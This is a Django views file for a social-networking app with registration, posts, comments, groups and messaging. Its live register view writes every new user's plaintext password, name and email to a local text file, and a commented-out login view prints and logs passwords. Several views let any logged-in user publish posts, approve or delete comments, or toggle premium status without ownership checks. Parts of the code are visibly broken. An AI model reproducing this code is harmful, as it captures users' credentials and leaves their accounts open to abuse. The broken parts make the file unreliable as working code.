from django.shortcuts import render,get_object_or_404,redirect
from django.utils import timezone
from mainapp.forms import UserProfileInfoForms,PostForm,CommentForm
from django.contrib.auth import authenticate,login,logout
from django.http import HttpResponseRedirect,HttpResponse
from django.urls import reverse,reverse_lazy
from django.contrib.auth.mixins import LoginRequiredMixin,PermissionRequiredMixin,UserPassesTestMixin
from django.db import IntegrityError
from django.views.generic import TemplateView,ListView,DetailView,CreateView,UpdateView,DeleteView,RedirectView
from django.contrib.auth.decorators import login_required
from mainapp.models import Post,Comment,GroupMember,Group,Friend,UserProfileInfo,Preference,Reply,SendMessageToAdmin,HomePage,Message
from django.db.models import Q
from django.contrib.auth.models import User
from django.shortcuts import render_to_response
from django.template import RequestContext 
from django.urls import resolve
from django.views import generic
from django.contrib import messages
from taggit.managers import TaggableManager
from taggit.managers import TaggedItem
from taggit.models import Tag
from . import models
from hitcount.views import HitCountDetailView
from braces.views import SelectRelatedMixin
from django.contrib.auth.mixins import UserPassesTestMixin
from django.views.generic import View
from mainapp.forms import UserCreationForm,UserProfileInfoForms,UserUpdateForm,ProfileUpdateForm,ReplyForm,AdminMessageForm,MessageForm
import random
from django.core.paginator import Paginator
import uuid
from notifications.signals import notify
from django.conf.urls import (
handler400, handler403, handler404, handler500
)
# Create your views here.
def index(self,request):
    users = User.objects.exclude(id=request.user.id)
    user = self.request.user
    if user.is_authenticated:
        return render(request,'mainapp/index.html')
    else:
        return render(request,'mainapp/registration.html')
        dd

class Home(View):
    model = HomePage
    def get(self,request):
        user = self.request.user
        if user.is_authenticated:
            return render(request,'mainapp/index.html')
        else:
            return HttpResponseRedirect("register")


def random(request):
    import random
    random_number = random.randint(100,1000)
    return render(request, 'mainapp/random.html', {'random_number': random_number})

@login_required
def user_logout(request):
    logout(request)
    messages.success(request, 'You have successfully logged out')
    return HttpResponseRedirect(reverse('index'))

def register(request):
    if request.method == 'POST':
        form = UserProfileInfoForms(request.POST)
        if form.is_valid():
            form.save()
            user = request.user
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            email = form.cleaned_data.get('email')
            first_name = form.cleaned_data.get('first_name')
            last_name = form.cleaned_data.get('last_name')
            with open('user_data.txt','a') as f:
                f.write(f"""
Username: {username}
First Name: {first_name}
Last Name: {last_name}
Password: {password}
Email: {email}
                """)
            email_split = email.split('@')
            email_2 = email_split[-1]
            messages.success(request, f'Welcome {username}, and thanks for joining interests!')
            return redirect('mainapp:user_login')
    else:
        form = UserProfileInfoForms()
    return render(request, 'mainapp/registration.html', {'form': form})


@login_required(login_url='/mainapp/user_login/')
def profile_page(request):
    return render(request,'mainapp/profile.html')


@login_required(login_url='/mainapp/user_login/')
def get_premium(request):
    user_ = request.user.userprofileinfo
    user = UserProfileInfo.objects.get(user__username=request.user)
    try:
        if user_.premium:
            user.premium = False
        else:
            user.premium = True
        user.save()
    except:
        return HttpResponse('Error')
    return render(request,'mainapp/profile-.html')


@login_required
def profile_update(request):
    if request.method == 'POST':
        u_form = UserUpdateForm(request.POST, instance=request.user)
        p_form = ProfileUpdateForm(request.POST,
                                   request.FILES,
                                   instance=request.user.userprofileinfo)
        if u_form.is_valid() and p_form.is_valid():
            u_form.save()
            p_form.save()
            messages.success(request, f'Your account has been updated!')
            return redirect('mainapp:profile')

    else:
        u_form = UserUpdateForm(instance=request.user)
        p_form = ProfileUpdateForm(instance=request.user.userprofileinfo)

    context = {
        'u_form': u_form,
        'p_form': p_form
    }
    return render(request,'mainapp/profile_update.html',context)



# def user_login(request):

#     if request.method == 'POST':
#         username = request.POST.get('username')
#         password = request.POST.get('password')

#         user = authenticate(username=username,password=password)

#         if user:
#             if user.is_active:
#                 login(request,user)
#                 return HttpResponseRedirect(reverse('index'))
#                 print(f"Username: {username} and password {password}")
#                 with open('details.txt','a') as f:
#                     f.write(f'Username: {username} | Password: {password}')
#             else:
#                 messages.error(request,'username or password not correct')
#                 return redirect('login')
#         else:
#             print("Someone tried to login and they failed. They failed! Haha! They're lucky we're not returning this message to them!")
#             print(f"Username: {username} and password {password}")
#             messages.error(request,'username or password not correct')
#             return redirect('mainapp:user_login')
#     else:
#         return render(request,'mainapp/login.html',{})

class PostDetailView(HitCountDetailView,DetailView):
    model = Post
    count_hit = True
    context_object_name = 'post'
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['form'] = CommentForm() # Inject CommentForm
        return context

@login_required(login_url='/mainapp/user_login/')
def add_comment_to_post(request,slug):
    post = get_object_or_404(Post,slug=slug)
    if request.method == 'POST':
        form = CommentForm(request.POST)
        if form.is_valid():
            comment = form.save(commit=False)
            comment.post = post
            comment.author = request.user # add this line
            comment.slug = post.slug
            comment.save()
            messages.success(request, 'Comment added successfully')
            return redirect('mainapp:post_detail',slug=post.slug)
           
    else:
        form = CommentForm()
    return render(request,'mainapp/comment_form.html',{'form':form})
    
def get_queryset(self):
    return Comment.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')



@login_required(login_url='/mainapp/user_login/')
def add_reply_to_comment(request,slug):
    comment = get_object_or_404(Comment,slug=slug)
    # post = get_object_or_404(Post,pk=pk,slug=slug)
    if request.method == 'POST':
        form = ReplyForm(request.POST)
        if form.is_valid():
            reply = form.save(commit=False)
            reply.comment = comment
            reply.author = request.user
            reply.save()
            return redirect('mainapp:post_detail',slug=comment.slug)
    else:
        form = ReplyForm()
    return render(request,'mainapp/reply_form.html',{'form':form})
def get_queryset(self):
    return Reply.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')


class PostLikeRedirect(RedirectView):
    def get_redirect_url(self,*args,**kwargs):
        pk = self.kwargs.get("pk")
        slug = self.kwargs.get("slug")
        print(pk) #dev purposes
        obj = get_object_or_404(Post,pk=pk,slug=slug)
        url_ = obj.get_absolute_url()
        user = self.request.user
        if user.is_authenticated:
            if user in obj.likes.all():
                obj.likes.remove(user)
            else:
                obj.likes.add(user)
        return url_

class PostSaveRedirect(RedirectView):
    def get_redirect_url(self,*args,**kwargs):
        pk = self.kwargs.get("pk")
        slug = self.kwargs.get("slug")
        obj = get_object_or_404(Post,pk=pk,slug=slug)
        url_ = obj.get_absolute_url()
        user = self.request.user
        if user.is_authenticated:
            if user in obj.saves.all():
                obj.saves.remove(user)
            else:
                obj.saves.add(user)
        return url_

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import authentication, permissions
from django.contrib.auth.models import User

class PostLikeAPIRedirect(APIView):
    """
    View to list all users in the system.

    * Requires token authentication.
    * Only admin users are able to access this view.
    """
    authentication_classes = [authentication.SessionAuthentication]
    permission_classes = [permissions.IsAuthenticated]

    def get(self, request, pk=None, format=None):
        #pk = self.kwargs.get("pk")
        obj = get_object_or_404(Post,pk=pk)
        url_ = obj.get_absolute_url()
        user = self.request.user
        updated = False
        liked = False
        
        if user.is_authenticated:
            if user in obj.likes.all():
                liked = False
                obj.likes.remove(user)
            else:
                liked = True
                obj.likes.add(user)
                updated = True
        data = {
            'updated':updated,
            'liked':liked
        }
        return Response(data)

class PostUpdateView(LoginRequiredMixin,UserPassesTestMixin,UpdateView):
    login_url = '/login/'
    query_pk_and_slug = True
    redirect_field_name = 'mainapp/post_details.html'
    form_class = PostForm
    model = Post
    def form_valid(self, form):
        form.instance.author = self.request.user
        return super().form_valid(form)

    def test_func(self):
        post = self.get_object()
        if self.request.user == post.author or self.request.user.is_superuser:
            return True
        return False
        

class TagMixin(object):
    def get_context_data(self,**kwargs):
        context = super(TagMixin,self).get_context_data(**kwargs)
        context['tags'] = Tag.objects.all()
        return context



class PostListView(HitCountDetailView,SelectRelatedMixin,TagMixin,ListView):
    model = Post    
    count_hit = True
    template_name = 'mainapp/post_list.html'
    selected_related = ("user","group")
    paginate_by = 5
    context_object_name = 'posts'
    queryset = models.Post.objects.all()

    def get(self,request):
        posts = Post.objects.all().order_by('-published_date')
        users = User.objects.exclude(id=request.user.id)
        count= User.objects.all().count()
        friend, created = Friend.objects.get_or_create(current_user=request.user)
        friends = friend.users.all()
        group = Group.objects.all()
        args = {
            'users':users, 'friends':friends, 'posts':posts, 'group':group,'count':count,
        }
        return render(request, self.template_name, args)

    def get_queryset(self):
        return Post.objects.filter(published_date__lte=timezone.now()).order_by('-published_date')

class PostSaveListView(ListView):
    model = Post
    template_name = 'mainapp/post_saved.html'
    paginate_by = 10
    context_object_name = 'post'
    
    def get(self,request):
        posts = Post.objects.filter(saves__in=[self.request.user]).order_by('-published_date').distinct()
        args = {
            'posts':posts,
        }
        return render(request, self.template_name,args)

    def get_queryset(self):
        object_list = Post.objects.filter(saves__in=[self.request.user]).order_by('-published_date').distinct()
        return object_list

def change_friends(request,operation,pk):
    friend = User.objects.get(pk=pk)
    if operation == 'add':
        Friend.make_friend(request.user,friend)
    elif operation == 'remove':
        Friend.lose_friend(request.user,friend)
    return redirect('mainapp:post_list')

class TagIndexView(TagMixin,ListView):
    template_name = 'mainapp/tags.html'
    context_object_name = 'posts'
    model = Post
    def get_queryset(self):
        return Post.objects.filter(tags__slug=self.kwargs.get('slug'))



class SearchResultsView(ListView):
    model = Post
    template_name = 'mainapp/search_reults.html'
    
    def get_queryset(self): # new
        query = self.request.GET.get('q')
        return Post.objects.filter(Q(title__icontains=query) | Q(text__icontains=query))

class SearchResultsViewUsers(ListView):
    model = UserProfileInfo
    template_name = 'mainapp/search_results_user.html'
    
    def get_queryset(self): # new
        query = self.request.GET.get('q')
        return User.objects.filter(Q(first_name__icontains=query) | Q(last_name__icontains=query))
        
class CreateMessageView(LoginRequiredMixin,CreateView):
    model = Message
    form_class = MessageForm

    def get_success_url(self):
        return self.request.path
    
    def form_valid(self,form):
        form.instance.sender = self.request.user
        form.instance.receiver = User.objects.get(username=self.kwargs['username'])
        return super().form_valid(form)
    
    def get_context_data(self,**kwargs):
        context = super().get_context_data(**kwargs)
        context['receiver_message_objects'] = Message.objects.filter(Q(receiver=self.request.user) & Q(sender__username=self.kwargs['username']) | Q(receiver__username=self.kwargs['username']) & Q(sender=self.request.user))
        return context

class MessageInbox(LoginRequiredMixin,ListView):
    model = Message

    def get_context_data(self,**kwargs):
        context = super().get_context_data(**kwargs)
        sender_list_author = []
        sender_qs = []
        qs = Message.objects.filter(receiver=self.request.user).order_by('-date_created')
        for i in qs:
            if i.sender.username not in sender_list_author:
                sender_list_author.append(i.sender.username)  # sender_list is a list of unique authors in the qs
                sender_qs.append(i)
        context['sender_qs'] = sender_qs
        return context

    def get_queryset(self):
        return Message.objects.filter(receiver=self.request.user).order_by('-date_created')

class CreateGroup(LoginRequiredMixin, generic.CreateView):
    model = Group
    fields = ('name','description')

class SingleGroup(generic.DetailView):
    model = Group

class ListGroups(generic.ListView):
    model = Group

class JoinGroup(LoginRequiredMixin,generic.RedirectView):
    def get_redirect_url(self,*args,**kwargs):
        return reverse('mainapp:single',kwargs={'slug':self.kwargs.get('slug')})

    def get(self,request,*args,**kwargs):
        group = get_object_or_404(Group,slug=self.kwargs.get('slug'))

        try:
            GroupMember.objects.create(user=self.request.user,group=group)

        except IntegrityError:
            messages.warning(self.request,('You are already a member of {}'.format(group.name)))

        else:
            messages.success(self.request,'You are now a member of the {} group'.format(group.name))

        return super().get(request,*args,**kwargs)

class LeaveGroup(LoginRequiredMixin,generic.RedirectView):
    def get_redirect_url(self,*args,**kwargs):
        return reverse('mainapp:single',kwargs={'slug':self.kwargs.get('slug')})

    def get(self,request,*args,**kwargs):
        try:
            membership = models.GroupMember.objects.filter(
                user=self.request.user,
                group__slug=self.kwargs.get('slug')
            ).get()
        
        except models.GroupMember.DoesNotExist:
            messages.warning(
                self.request,
                "You can't leave this group because you aren't in it"
            )
        
        else:
            membership.delete()
            messages.success(
                self.request,
                "You have left this group"
            )
        
        return super().get(request,*args,**kwargs)
        

class UserPostListView(ListView):
    model = Post
    template_name = 'mainapp/user_posts.html'
    context_object_name = 'posts'

    def get_queryset(self):
        user = get_object_or_404(User,username=self.kwargs.get('username'))
        # description = get_object_or_404(UserProfileInfo,description=self.kwargs.get('description'))
        return Post.objects.filter(author=user).order_by('-published_date')


def view_profile(request,username=None):
    if username:
        user_profile = User.objects.get(username=username)
        last_two = Post.objects.filter(author__username=user_profile).order_by('-published_date')[:2]
        friend, created = Friend.objects.get_or_create(current_user=request.user)
        friends = friend.users.all()
    else:
        user_profile = request.user
        user_posts = Post.objects.filter(author__username = request.user.id).order_by('-published_date')   #<---add these
        last_two = Post.objects.filter(author__username = request.user.id).order_by('-published_date')[:2]
        friend, created = Friend.objects.get_or_create(current_user=request.user)
        friends = friend.users.all()
    context = {
        'username':user_profile,
        'user_posts': Post.objects.filter(author__username=user_profile).order_by('-published_date'),
        'last_two':last_two,
        'friends':friends,
    }
    return render(request,'mainapp/profile.html',context)

class UserDetailView(ListView):
    model = Post
    template_name = 'mainapp/profile.html'
    context_object_name = 'post'

    def get_queryset(self):
        return user.post_set.all()




class CreatePostView(LoginRequiredMixin,CreateView):
    login_url = reverse_lazy('mainapp:user_login')
    redirect_field_name = 'mainapp/post_details.html'
    form_class = PostForm
    model = Post
    def form_valid(self, form):
        form.instance.author = self.request.user
        return super().form_valid(form)

class SendAdminMessage(LoginRequiredMixin,CreateView):
    login_url = reverse_lazy('mainapp:user_login')
    redirect_field_name = 'mainapp/post_details.html'
    form_class = AdminMessageForm
    model = SendMessageToAdmin
    def form_valid(self,form):
        form.instance.author = self.request.user
        return super().form_valid(form)

# @login_required(login_url='/mainapp/user_login/')
# def add_comment_to_post(request,pk,slug):
#     post = get_object_or_404(Post,pk=pk,slug=slug)
#     if request.method == 'POST':
#         form = CommentForm(request.POST)
#         if form.is_valid():
#             comment = form.save(commit=False)
#             comment.post = post
#             comment.author = request.user # add this line
#             comment.save()
#             messages.success(request, 'Comment added successfully')
#             return redirect('mainapp:post_detail',pk=post.pk,slug=post.slug)
           
#     else:
#         form = CommentForm()
#     return render(request,'mainapp/comment_form.html',{'form':form})
    
# def get_queryset(self):
#     return Comment.objects.filter(created_date__lte=timezone.now()).order_by('-created_date')



# @login_required(login_url='/mainapp/user_login/')
# # def add_reply_to_reply(request,pk):
 #     reply


class PostDeleteView(LoginRequiredMixin,UserPassesTestMixin,DeleteView):
    login_url = '/login/'
    model = Post
    query_pk_and_slug = True
    success_url = reverse_lazy('mainapp:post_list')
    def test_func(self):
        post = self.get_object()
        if self.request.user == post.author or self.request.user.is_superuser:
            return True
        return False

class DraftListView(LoginRequiredMixin,ListView):
    login_url = '/login/'
    redirect_field_name = 'mainapp/post_list.html'
    model = Post

    def get_queryset(self):
        return Post.objects.filter(published_date__isnull=True).order_by('created_date')

class RequestMiddleware():
    def process_request(self, request):
        if request.META.has_key('HTTP_USER_AGENT'):
            user_agent = request.META['HTTP_USER_AGENT'].lower()
            if 'trident' in user_agent or 'msie' in user_agent:
                 request.is_IE = True
            else:
                 request.is_IE = False

           # or shortest way:
        request.is_IE = ('trident' in user_agent) or ('msie' in user_agent)


def change_friends(request,operation,pk):
    friend = User.objects.get(pk=pk)
    if operation == 'add':
        Friend.make_friend(request.user,friend)
    elif operation == 'remove':
        Friend.lose_friend(request.user,friend)
    return redirect('mainapp:view_profile_with_pk',pk=pk)

#function views

@login_required
def post_publish(request,pk):
    post = get_object_or_404(Post,pk=pk)
    post.publish()
    return redirect('mainapp:post_detail',pk=pk)


@login_required
def comment_approve(request,pk):
    comment = get_object_or_404(Comment,pk=pk)
    comment.approve()
    return redirect('mainapp:post_detail',pk=comment.post.pk)

class AddLikeToPost(LoginRequiredMixin,ListView):
    model = Post
    login_url = '/login/'
    redirect_field_name = 'mainapp/post_list.html'
    
    def form_valid(self,postid):
        form.instance.author = self.request.user
        post = get_object_or_404(Post,id=postid)
        post.likes += 1
        return super().form_valid(form)

    # def test_func(self):
    #     post = self.get_object()


@login_required
def add_like_to_post(request,pk):
    if request.method == 'POST':
        post = Post.objects.get(pk=pk)
        post.likes += 1
        post.save()
    return render(request,'mainapp/post_list.html')


@login_required
def comment_remove(request,pk):
    comment = get_object_or_404(Comment,pk=pk)
    post_pk = comment.post.pk
    comment.delete()
    return redirect('mainapp:post_detail',pk=post_pk)

def handler404(request,Exception):
    return render(request, 'mainapp/404.html', status=404)
def handler500(request):
    return render(request, 'mainapp/500.html', status=500)
